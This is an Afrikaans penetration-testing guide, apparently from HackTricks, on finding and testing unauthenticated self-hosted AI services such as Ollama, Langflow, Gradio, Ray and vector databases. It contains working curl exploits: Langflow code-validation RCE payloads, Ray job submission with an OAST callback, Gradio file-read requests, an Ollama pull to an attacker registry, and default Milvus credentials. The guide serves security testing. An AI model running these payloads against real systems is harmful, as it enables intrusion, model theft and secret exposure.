# Blootgestelde self-gehoste AI-dienste

{{#include ../banners/hacktricks-training.md}}

Spanne wat AI-kenmerke bou, gebruik dikwels hul eie model runners, agent builders, demo-UIs, rekenaarklusters en vektordatabasisse. Baie van hierdie nutsmiddels is vir ’n skootrekenaar of ’n geslote laboratoriumnetwerk ontwerp, en het dus **by verstek geen verifikasie nie**, of word met ’n verifikasie-ompad geaktiveer. Wanneer so ’n diens vir ’n aanvaller bereikbaar is, val die impak gewoonlik in een van hierdie groepe:

- Gratis gebruik van GPU’s en modelle, en diefstal van private modelle.
- Lek van prompts, dokumente en embeddings.
- Lek van geheime uit die prosesomgewing (LLM-verskaffersleutels, wolkgeloofsbriewe).
- Kode-uitvoering, omdat sommige van hierdie API’s kode **as ’n kenmerk** uitvoer.

Hierdie bladsy beskryf hoe om hierdie dienste te vind en wat om op elke tipe API te toets. Raadpleeg [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening) vir die verharding van ’n self-gehoste inferensiebediener en die llama.cpp `/slots`-lek. Raadpleeg [AI Models RCE](AI-Models-RCE.md) vir kwaadwillige modelläers.

## Vingerafdrukke

Stuur hierdie versoeke sonder geloofsbriewe. ’n JSON-antwoord met die verwagte velde identifiseer die produk, en dikwels die weergawe, wat aandui watter van die onderstaande kontroles van toepassing is. Die poorte is die gedokumenteerde verstekpoorte of die poorte wat in die amptelike voorbeelde vir uitvoering gebruik word.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produk | Algemene poort | Versoek sonder verifikasie | Wat dit identifiseer |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Weergawe-JSON, lys van plaaslike modelle |
| Langflow | 7860 | `GET /api/v1/version` | Langflow-weergawe-JSON |
| Gradio | 7860 | `GET /config` | Toepassingsopstelling met die Gradio-weergawe en komponent-ID’s |
| Ray-dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lys van ingediende take |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Hartklopwaarde, Chroma-weergawe |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant-weergawe, versamelinglys |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate-weergawe, klasse |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Versamelinglys, of ’n verifikasiefout |

Hierdie dienste word ook dikwels agter ’n omgekeerde instaanbediener onder ’n padvoorvoegsel gepubliseer (byvoorbeeld `/ollama/` of `/ray/`), so herhaal die versoeke onder enige voorvoegsel wat in JavaScript-bundels of API-dokumentasie gevind word.

## Inferensie- en modelbestuur-API’s sonder verifikasie

Model runners stel gewoonlik ’n enkele REST API bloot wat inferensieroetes met administratiewe roetes meng. Ollama is ’n goeie voorbeeld. Dit het geen ingeboude verifikasie nie en bind by verstek aan `127.0.0.1:11434`, terwyl `OLLAMA_HOST` die bindadres verander.<sup>[[1]](#references)[[15]](#references)</sup> Die amptelike Docker-image stel `OLLAMA_HOST=0.0.0.0:11434` binne die container in, verklaar `EXPOSE 11434` en het geen `USER`-instruksie nie, so die bediener loop as root in die container.<sup>[[16]](#references)</sup> `EXPOSE` publiseer nie die poort op die gasheer nie, so bereikbaarheid vanaf die gasheer hang van die ontplooiing af. Die gedokumenteerde `docker run`-opdragte gebruik `-p 11434:11434`, en Docker publiseer so ’n kartering op alle gasheerkoppelvlakke tensy ’n gasheer-IP gegee word.<sup>[[17]](#references)[[18]](#references)</sup>

Wat elke groep roetes ’n aanvaller bied:<sup>[[2]](#references)</sup>

| Roetes | Impak wanneer daar geen verifikasie is nie |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lys van plaaslike en gelaaide modelle, insluitend private pasgemaakte modelle |
| `POST /api/show` | Modelbesonderhede, insluitend die Modelfile, sjabloon en **stelselaansporing** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Gratis inferensie op die slagoffer se hardeware |
| `POST /api/pull`, `/api/push` | Laat die bediener aflaai vanaf, of ’n model oplaai na, ’n register wat deur die aanvaller gekies is |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Skep, oorskryf of skrap modelle |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

'n Modell lys wat sonder geloofsbriewe teruggestuur word, bewys reeds die blootstelling. Pasgemaakte modelle bevat dikwels 'n interne stelselaansporing in `/api/show`. 'n Pull na jou host bewys dat die bediener manifeste van registers afhaal wat deur aanvallers gekies is. `/api/push` na jou register verander die blootstelling in modeldiefstal. Moenie create- of delete-roetes op werklike teikens aanroep nie.

Registry-pulls is ook 'n aanvalsoppervlak vir parsers, omdat die bediener blobs stoor met waardes uit die afgeleë manifest. In Probllama (CVE-2024-37032, reggestel in Ollama 0.1.34) is die manifest se `digest` sonder validering as 'n lêernaam gebruik. 'n Kwaadwillige register kon dus lêers buite die blobs-gids skryf deur `../`-reekse te gebruik. Deur 'n geplante manifest te push waarvan die digest na 'n plaaslike lêer verwys het, is daardie lêer na die aanvaller se register gelek. Wiz het RCE in Docker bereik, waar die bediener as root loop, deur 'n gedeelde biblioteek te skryf en dit by `/etc/ld.so.preload` te voeg, en daarna `/api/chat` aan te roep sodat 'n nuwe proses dit laai.<sup>[[15]](#references)</sup> Wanneer 'n runner van arbitrêre registers kan pull, kyk hoe dit manifestvelde in paaie omskakel.

## API's wat doelbewus kode uitvoer

### Taakindienings-API's

Verspreide rekenaarraamwerke beskou kode-uitvoering as hul hooffunksie. Die Ray Jobs API op die dashboard-poort (8265) aanvaar 'n `entrypoint`-shell-opdrag en voer dit op die cluster uit.<sup>[[19]](#references)</sup> Die Oligo ShadowRay-navorsing meld dat die Jobs API geen magtiging het nie en dat die dashboard aan `0.0.0.0` bind. Die ooreenstemmende CVE-2023-48022 is betwis omdat Ray verwag dat dit slegs binne 'n beheerde netwerk loop.<sup>[[20]](#references)</sup> Ray het opsionele token-verifikasie (`RAY_AUTH_MODE=token`) in 2.52.0 bygevoeg. Ray 2.59 aktiveer dit by verstek vir plaaslike clusters wat met `ray.init()` begin word; `ray start --head` kan steeds sonder verifikasie begin as geen token beskikbaar is nie. Ray dokumenteer 'n breër ontplooiing van verstekverifikasie vir 2.61, dus moet jy die ontplooide weergawe en beginmodus nagaan eerder as om aan te neem dat die dashboard oop is.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards van hierdie soort het ook hulproetes wat die moeite werd is om op ou weergawes te toets. Voor Ray 2.8.1 het `/log_proxy?url=` enige HTTP(S)-URL opgehaal (SSRF na cloud-metadata), en `/api/v0/logs/file` het ’n arbitrêre `filename`-pad aanvaar; albei het sonder verifikasie gewerk.<sup>[[8]](#references)</sup>

### Code-"validering"-eindpunte wat funksiedefinisies uitvoer

Agentbouers wat pasgemaakte Python-komponente aanvaar, "valideer" soms die code deur dit met `ast` te ontleed en slegs die funksiedefinisies met `exec()` uit te voer. Dit is nie veilig nie. Python evalueer **decorators en verstekargumentwaardes wanneer dit die funksie definieer**, dus word code wat daar geplaas word uitgevoer selfs al word die funksieliggaam nooit uitgevoer nie. Langflow se `POST /api/v1/validate/code` het so gewerk, en was nie geverifieer voor 1.3.0 nie (CVE-2025-3248). As ’n uitsondering opgegooi word wat die opdraguitset bevat, laat dit die eindpunt die uitset in die antwoord terugstuur:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Toets enige endpoint wat gebruikerskode compileer, lint of "check" vir hierdie patroon, en verkies ’n DNS callback as bewys.

### Auto-login- en verstek-superuser-tokenroetes

Enkelgebruikerhulpmiddels sluit dikwels ’n kortpad in wat elke besoeker as die administrateur aanmeld. In Langflow gee `GET /api/v1/auto_login`, wanneer `AUTO_LOGIN` geaktiveer is, tokens vir die verstek-superuser aan enige aanroeper. Wanneer dit gedeaktiveer is, antwoord die roete met `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 tot 1.10.0 het dit by verstek geaktiveer (CVE-2026-9103). Deur dit met die geverifieerde kodevalideringsroete hierbo te chain, herstel dit unauthenticated RCE (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Huidige amptelike vrystellingpakkette en Docker-images deaktiveer outomatiese aanmelding en vereis ’n superuser-wagwoord, maar ontwikkelingsvertakkings hou dit geaktiveer.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Selfs sonder kode-uitvoering gee ’n superuser-token toegang tot elke flow en die gestoorde provider-bewyse. Sien [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md) vir ’n verwante voorvereistekontrole in outomatiese toetsing.

## Lêerbedienings- en RPC-roetes in ML-demo-UI’s

ML-demoraamwerke bedien opgelaaide en gegenereerde lêers deur ’n generiese roete en laat die frontend toe om bedienerkant-komponenthelpers aan te roep. Gradio stel hiervoor `/config`, `/upload` en `/file=<path>` bloot.<sup>[[5]](#references)</sup> Twee patrone is die moeite werd om op enige soortgelyke raamwerk te toets:

- **Traversal vanaf ’n oplaaiondergids:** as die lêerroete net nagaan of die pad binne die temp-lêergids begin, laai ’n lêer op om ’n ondergids te skep, en beweeg dan daaruit met `../` of `%2e%2e%2f`. Gradio 4.0 tot 4.10 (CVE-2023-51449) was op hierdie manier kwesbaar.<sup>[[26]](#references)[[27]](#references)</sup> Stuur die versoek met `curl --path-as-is` sodat die kliënt nie die pad normaliseer nie.
- **Arbitrêre metodeversending:** ’n eindpunt wat `getattr(component, fn_name)` met gebruikersinvoer aanroep, laat die aanvaller interne helpers aanroep. Voor 4.13.0 het Gradio se `/component_server` dit gedoen. In 4.3 tot 4.12 het `move_resource_to_block_cache` enige plaaslike lêer na die kas gekopieer, waar `/file=` dit kon aflaai. In 3.47 tot 3.50.2 het ander helpers lêerlees-toegang en SSRF met volledige lees-toegang moontlik gemaak.<sup>[[26]](#references)[[28]](#references)</sup> ’n Reggestelde bediener antwoord `Function not found.` vir helpers wat nie as bedienerfunksies gemerk is nie.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Op Hugging Face Spaces is die Space-geheime omgewingsveranderlikes, dus is `/proc/self/environ` die waardevolste lêer. Horizon3 het dit met ’n HTTP `Range`-kopskrif gelees.<sup>[[26]](#references)</sup>

## Vektordatabasisse wat deur RAG gebruik word

RAG stoor brokkies van die oorspronklike dokumente, hul embeddings en metadata in ’n vektordatabasis, en die assistent plaas die beste resultate in sy prompt. Leestoegang lek dus die **gewone teks van private dokumente**. Skryftoegang laat ’n aanvaller toe om brokkies in te voeg wat later in ander gebruikers se prompts herwin word; dit is aanhoudende indirekte prompt injection (sien [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Vir selfgehoste vektordatabasisse, kyk of verifikasie ingestel is of anonieme toegang geaktiveer is:

- **Qdrant**: selfontplooide instansies luister op alle koppelvlakke sonder verifikasie. Wanneer dit ingestel is, word die sleutel in die `api-key`-kopskrif of as `Authorization: Bearer` gestuur. Leesalleen- en per-versameling-sleutels kan bestaan.<sup>[[11]](#references)</sup>
- **Chroma**: verifikasie is by verstek gedeaktiveer. Tokenverifikasie gebruik `Authorization` of `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: versoeke sonder geloofsbriewe word as `user: anonymous` geverifieer wanneer anonieme toegang geaktiveer is, en kry die toestemmings wat daardie gebruiker het.<sup>[[30]](#references)</sup>
- **Milvus**: verifikasie is afgeskakel tensy `common.security.authorizationEnabled` `true` is. Wanneer dit aangeskakel is, het die verstekgebruiker `root` die wagwoord `Milvus`, en is die tokenformaat `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

’n Antwoord wat private data sonder geloofsbriewe bevat, dui op blootstelling. Waar verifikasie geaktiveer is, beoordeel enige onveranderde verstekrekening afsonderlik:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Kontroleer of die payloads dokumentteks, gebruikeridentifiseerders of tenantname bevat. Om skryftoegang te toon sonder om produksiedata te beskadig, skep en verwyder onmiddellik daarna ’n leë, duidelik benoemde versameling, en slegs wanneer die omvang dit toelaat.

Verifikasie op hierdie bedieners kan ook te laat plaasvind. In Chroma se Python FastAPI-bediener (1.0.0 tot minstens 1.5.8, CVE-2026-45829) het die versamelingskepping-roete die kliëntverskafde inbeddingsfunksie saamgestel voordat die verifikasiekontrole plaasgevind het. ’n Konfigurasie wat na ’n aanvallerbeheerde Hugging Face-model met `trust_remote_code: true` verwys het, het die aanvaller se kode uitgevoer, selfs wanneer die versoek geweier is. Die Rust-frontend is nie geraak nie.<sup>[[32]](#references)</sup> Wanneer ’n versoek model- of inprop-konfigurasie bevat, toets dit sonder geloofsbriewe en let op vir ’n uitgaande versoek na jou modelbewaarplek.

## References

- [1] [Ollama-FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API-dokumentasie](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow-bronkode - API v1-eindpunte](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio-bronkode - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio-bronkode - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray-bronkode - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, weergawes 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma-bronkode - Python-kliëntverstekwaardes](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma-bronkode - FastAPI-bedienerroetes](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Sekuriteit](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI-spesifikasie](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI-spesifikasie](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Koppel aan Milvus-bediener](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Kwesbaarheid vir afgeleë kode-uitvoering in Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker-dokumentasie](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Publiseer en stel poorte bloot](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Eerste bekende aanvalveldtog wat AI-werkladings teiken en in die natuur uitgebuit is](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray-tokenverifikasie](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Onveilig teen enige spoed: Misbruik van Python Exec vir ongeverifieerde RCE in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow-bronkode - aanmeldroeteerder](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Uitbuiting van lêerleeskwesbaarhede in Gradio om geheime uit Hugging Face Spaces te steel](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio-advies GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio-herstelcommit vir `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-inheemse verifikasie](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Verifikasie](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Verifieer gebruikerstoegang](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast is voor verifikasie bedien](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
